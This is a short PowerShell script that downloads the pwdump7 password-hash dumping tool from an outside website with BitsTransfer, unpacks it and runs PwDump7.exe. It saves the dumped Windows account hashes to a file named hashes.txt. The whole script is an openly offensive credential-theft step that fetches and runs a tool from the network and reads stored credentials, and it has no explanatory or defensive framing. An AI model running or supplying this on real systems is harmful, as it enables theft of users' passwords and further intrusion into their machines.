#Download pwdump7
$url = "http://www.tarasco.org/security/pwdump_7/pwdump7.zip"
$output = "$PSScriptRoot\pwdump7.zip"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output

#Extract downloaded file
Expand-Archive $PSScriptRoot\pwdump7.zip -DestinationPath $PSScriptRoot\pwdump7

#Run pwdump7, pipe output in same path as script
& $PSScriptRoot\pwdump7\PwDump7.exe > hashes.txt